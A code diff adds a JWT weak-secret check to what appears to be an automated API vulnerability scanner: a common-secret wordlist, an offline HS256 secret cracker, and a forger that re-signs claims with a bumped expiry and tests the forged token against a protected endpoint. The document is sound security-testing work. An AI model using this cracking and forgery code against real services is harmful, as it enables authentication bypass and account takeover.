@@ -10,6 +10,11 @@ A Verdict is CONFIRMED (oracle fired), REJECTED (clean negative), or INCONCLUSIV
 request failed, WAF/error status, or no oracle). Findings are emitted ONLY on CONFIRMED — code
 decides whether a vuln is real, never the LLM. INCONCLUSIVE is a coverage gap, never a finding."""
 from __future__ import annotations
+import base64
+import hashlib
+import hmac
+import json as _jsonmod
+import time
 import urllib.parse
 from dataclasses import dataclass, field
 from typing import Callable, Mapping
@@ -366,6 +371,85 @@ def verify_error_sqli(candidate: Candidate, transport: Transport) -> Verdict:
                    f"a single quote broke a SQL string context ({sig!r}); the injected input is echoed in the database error")
 
 
+# --- broken authentication (OWASP API2): a weak HS256 JWT signing secret --------------------
+# A small common-secret list (a real engagement would load a wordlist; this is the cheap check).
+_JWT_WORDLIST = (
+    "secret", "your-256-bit-secret", "changeme", "change_me", "password", "passw0rd", "key",
+    "jwt", "jwtsecret", "jwt_secret", "supersecret", "super_secret", "mysecret", "my_secret",
+    "secretkey", "secret_key", "token", "admin", "123456", "12345678", "random", "secret123",
+    "s3cr3t", "topsecret", "default", "test", "qwerty", "letmein", "root", "vampi", "flask",
+    "django-insecure", "CHANGE_ME", "Sup3rS3cr3t",
+)
+
+
+def _b64url_decode(s):
+    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
+
+
+def _b64url(b):
+    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()
+
+
+def _crack_hs256(token, wordlist):
+    """Recover the HS256 signing secret of a JWT from a wordlist (offline). None if not found."""
+    parts = token.split(".")
+    if len(parts) != 3:
+        return None
+    try:
+        header = _jsonmod.loads(_b64url_decode(parts[0]))
+    except Exception:
+        return None
+    if str(header.get("alg", "")).upper() != "HS256":
+        return None
+    signing_input = (parts[0] + "." + parts[1]).encode()
+    try:
+        want = _b64url_decode(parts[2])
+    except Exception:
+        return None
+    for secret in wordlist:
+        got = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
+        if hmac.compare_digest(got, want):
+            return secret
+    return None
+
+
+def _forge_hs256(token, secret):
+    """Re-sign the token's claims (with a bumped expiry) using `secret` — a NEW, valid token."""
+    h, p, _sig = token.split(".")
+    claims = _jsonmod.loads(_b64url_decode(p))
+    claims["exp"] = int(time.time()) + 3600
+    np = _b64url(_jsonmod.dumps(claims, separators=(",", ":")).encode())
+    signing_input = (h + "." + np).encode()
+    sig = _b64url(hmac.new(secret.encode(), signing_input, hashlib.sha256).digest())
+    return f"{h}.{np}.{sig}"
+
+
+def verify_jwt_weak_secret(candidate: Candidate, transport: Transport) -> Verdict:
+    """Oracle: the JWT HS256 secret is recoverable from a common-secret wordlist, AND a token
+    forged with it (claims re-signed, expiry bumped) is ACCEPTED by a protected endpoint — proving
+    an attacker can mint arbitrary valid tokens. Reported as broken-authentication."""
+    o = candidate.oracle
+    token, verify_url = o.get("token"), o.get("verify_url")
+    if not token or not verify_url:
+        return Verdict(INCONCLUSIVE, "broken-authentication", candidate.location,
+                       "no token / protected endpoint to test against")
+    secret = _crack_hs256(token, o.get("wordlist") or _JWT_WORDLIST)
+    if secret is None:
+        return Verdict(REJECTED, "broken-authentication", candidate.location,
+                       "HS256 secret not recovered from the common-secret wordlist")
+    forged = _forge_hs256(token, secret)
+    try:
+        status, _b = transport.request("GET", verify_url, headers={"Authorization": "Bearer " + forged})
+    except Exception:
+        return Verdict(INCONCLUSIVE, "broken-authentication", candidate.location,
+                       "could not test the forged token")
+    if status == 200:
+        return Verdict(CONFIRMED, "broken-authentication", candidate.location,
+                       f"the HS256 signing secret is weak ({secret!r}); a forged token was accepted")
+    return Verdict(INCONCLUSIVE, "broken-authentication", candidate.location,
+                   f"secret recovered ({secret!r}) but the forged token was not accepted at {verify_url}")
+
+
 # --- mass assignment (OWASP API6): a client-supplied privilege field persists at registration ---
 # Boolean privilege flags only. 'role'/'verified'/'is_active' are deliberately excluded — apps
 # legitimately let users pick those at signup, so they are not near-zero-FP signals.
@@ -563,6 +647,7 @@ _REGISTRY: dict = {
     "sqli-error": verify_error_sqli,
     "excessive-data-exposure": verify_exposure,
     "mass-assignment": verify_mass_assignment,
+    "jwt-weak-secret": verify_jwt_weak_secret,
 }
 
 
